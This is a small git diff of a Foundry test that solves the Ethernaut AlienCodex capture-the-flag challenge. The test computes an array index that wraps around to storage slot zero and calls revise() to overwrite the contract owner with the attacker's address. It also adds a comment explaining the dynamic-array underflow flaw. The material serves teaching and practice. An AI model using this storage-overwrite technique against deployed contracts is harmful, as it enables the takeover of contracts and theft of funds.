@@ -16,7 +16,6 @@ contract AlienCodexTest is Test {
     function test_isSolved() public {
         vm.startPrank(attacker);
 
-
         bytes memory alienCodexBytesCode = abi.encodePacked(
             vm.getCode("./src-0_5_x/19_AlienCodex.json")
         );
@@ -39,7 +38,6 @@ contract AlienCodexTest is Test {
 
         uint codexIndexForSlotZero = ((2**256) - 1) - uint(keccak256(abi.encode(1))) +1;
         bytes32 newOwner = bytes32(uint256(uint160(attacker)));
-
         (bool success3,) = alienCodexChallenge.call(abi.encodeWithSignature("revise(uint256,bytes32)",codexIndexForSlotZero,newOwner));
         require(success3);
 
@@ -52,6 +50,7 @@ contract AlienCodexTest is Test {
             uint160(bytes20(uint160(uint256(bytes32(data)) << 0)))
         );
 
+        //dont modify of the array length of a dynamic array as they can overwrite the whole contract's storage using overflows and underflows.
 
         assertEq( refinedData, attacker);
         
